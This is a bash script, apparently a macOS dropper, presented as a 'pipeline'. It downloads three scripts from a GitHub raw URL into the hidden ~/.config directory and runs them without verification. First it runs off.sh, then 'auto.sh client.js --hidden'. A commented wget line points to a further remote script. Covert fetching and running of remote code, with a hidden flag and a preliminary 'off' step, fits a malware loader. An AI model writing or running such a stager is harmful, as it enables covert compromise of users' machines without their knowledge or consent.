#!/usr/bin/env bash
#
# Mac-only pipeline:
#   1. Download off.sh, auto.sh, client.js from GitHub (via wget)
#   2. Run off.sh  — abort if it fails
#   3. Run: bash auto.sh client.js --hidden
#
set -euo pipefail

# ---------- CONFIG (edit these) ----------
GITHUB_USER="rahul-call"
GITHUB_REPO="inner"
BRANCH="main/ror"                       # main / master / tag
WORKDIR="$HOME/.config"  # where the files land
FILES=("off.sh" "auto.sh" "client.js")
# -----------------------------------------
# wget https://raw.githubusercontent.com/asrafulshaheed-oss/extra/main/macone.sh

BASE_URL="https://raw.githubusercontent.com/${GITHUB_USER}/${GITHUB_REPO}/${BRANCH}"

# 1. Pre-flight: wget must exist (not bundled on macOS by default)
if ! command -v wget >/dev/null 2>&1; then
  echo "ERROR: wget not found. Install it first with:  brew install wget" >&2
  exit 1
fi

mkdir -p "$WORKDIR"
cd "$WORKDIR"

# 2. Download the three files
for f in "${FILES[@]}"; do
  echo "→ Downloading ${f} ..."
  wget --quiet --show-progress -O "$f" "${BASE_URL}/${f}"
done

# Make the shell scripts executable (client.js does not need +x)
chmod +x off.sh auto.sh

# 3. Run off.sh — only continue if it exits 0
echo
echo "→ Running off.sh ..."
if bash off.sh; then
  echo "✔ off.sh finished successfully."
else
  echo "✘ off.sh failed (exit $?). Aborting." >&2
  exit 1
fi

# 4. Run the second stage
echo
echo "→ Running: bash auto.sh client.js --hidden"
bash auto.sh client.js --hidden

echo
echo "✔ Pipeline complete."
